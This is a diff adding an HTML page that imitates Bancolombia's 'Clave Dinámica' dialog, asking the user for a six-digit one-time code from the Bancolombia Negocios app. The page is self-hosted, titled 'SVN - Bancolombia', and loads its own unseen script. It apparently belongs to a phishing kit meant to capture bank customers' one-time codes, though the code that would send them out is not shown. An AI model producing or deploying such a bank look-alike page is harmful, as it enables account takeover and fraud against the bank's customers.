@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="es" translate="no">
+<head>
+  <meta charset="UTF-8" />
+  <title>SVN - Bancolombia</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="preconnect" href="https://library-sdb.apps.bancolombia.com" crossorigin />
+  <link href="https://library-sdb.apps.bancolombia.com/assets/1.22.0/fonts/Open_Sans/Open_Sans.css" rel="stylesheet" />
+  <link href="https://library-sdb.apps.bancolombia.com/assets/1.22.0/fonts/CIBFont/CIBFont.css" rel="stylesheet" />
+  <link rel="stylesheet" href="css/clave.css" />
+</head>
+<body>
+  <div class="app-bg" aria-hidden="true">
+    <img src="assets/otp-bg.png" alt="" />
+  </div>
+
+  <article class="bc-key-validation bc-key-validation-active" id="otp-modal" role="dialog" aria-labelledby="otp-title" aria-modal="true">
+    <div class="bc-key-validation-dialog" role="alertdialog" aria-modal="true">
+      <div class="bc-key-validation-close">
+        <button type="button" id="otp-close" aria-label="cerrar">×</button>
+      </div>
+      <div class="bc-key-validation-content" id="otp-content">
+        <div class="bc-key-validation-header">
+          <div class="bc-key-validation-dynamic-container">
+            <svg class="otp-strokes" viewBox="0 0 220 80" aria-hidden="true">
+              <path d="M8 18 C 40 8, 70 28, 96 14" fill="none" stroke="#f4d24a" stroke-width="7" stroke-linecap="round"/>
+              <path d="M18 38 C 52 22, 88 48, 118 28" fill="none" stroke="#f07a3a" stroke-width="8" stroke-linecap="round"/>
+              <path d="M38 62 C 72 48, 102 70, 138 54" fill="none" stroke="#3ecf8e" stroke-width="7" stroke-linecap="round"/>
+              <path d="M70 8 C 92 2, 108 22, 128 10" fill="none" stroke="#7ed0ea" stroke-width="6" stroke-linecap="round"/>
+            </svg>
+            <div class="otp-app-icon" aria-hidden="true">
+              <span>Mi</span>
+              <svg viewBox="0 0 32 32">
+                <path d="M8.08 11.06c.15.57.73.87 1.33.67 4.86-1.47 9.74-2.48 14.77-3.22.58-.08.89-.66.68-1.25-.45-1.24-.67-1.86-1.13-3.09-.19-.53-.72-.87-1.25-.81-4.92.6-9.67 1.48-14.43 2.84-.62.19-1 .87-.84 1.48.35 1.35.52 2.02.87 3.38z" fill="#fff"/>
+                <path d="M27.56 11.79c-.19-.56-.7-.93-1.2-.86-7.65.97-15.09 2.85-22.15 5.95-.51.24-.82.89-.71 1.45.28 1.45.42 2.18.7 3.63.12.62.7.91 1.28.63 7.17-3.26 14.75-5.34 22.52-6.58.49-.08.75-.64.56-1.22-.39-1.2-.59-1.8-.99-3z" fill="#fff"/>
+                <path d="M27.62 19.9c-.19-.6-.74-.99-1.26-.88-4.75 1.04-9.39 2.29-13.99 3.88-.58.21-.91.83-.76 1.4.37 1.36.55 2.04.92 3.4.17.64.89.96 1.54.71 4.6-1.66 9.24-3.1 13.99-4.26.45-.11.68-.65.51-1.2-.37-1.22-.56-1.83-.95-3.05z" fill="#fff"/>
+              </svg>
+            </div>
+          </div>
+          <h3 id="otp-title">Ingresa la Clave Dinámica</h3>
+        </div>
+        <div class="bc-key-validation-body">
+          <p class="bc-key-validation-description">Encuentra tu Clave Dinámica en la app Bancolombia Negocios.</p>
+          <div class="bc-key-validation-input-container">
+            <div class="bc-input-token-container" id="otp-slots">
+              <input class="bc-input" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar primer dígito" />
+              <input class="bc-input" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar segundo dígito" />
+              <input class="bc-input" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar tercer dígito" />
+              <input class="bc-input" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar cuarto dígito" />
+              <input class="bc-input" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar quinto dígito" />
+              <input class="bc-input" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Ingresar sexto dígito" />
+            </div>
+          </div>
+        </div>
+        <div class="bc-key-validation-footer">
+          <div class="bc-key-validation-action-container">
+            <button class="btn-secondary" type="button" id="otp-clear">Borrar</button>
+            <button class="btn-primary" type="button" id="otp-next" disabled>Continuar</button>
+          </div>
+        </div>
+      </div>
+      <div class="bc-key-validation-content-loading" id="otp-validating" hidden>
+        <span class="validate-spin" aria-hidden="true"></span>
+        <p>Validando Clave Dinámica...</p>
+      </div>
+    </div>
+  </article>
+
+  <script src="js/clave.js"></script>
+</body>
+</html>
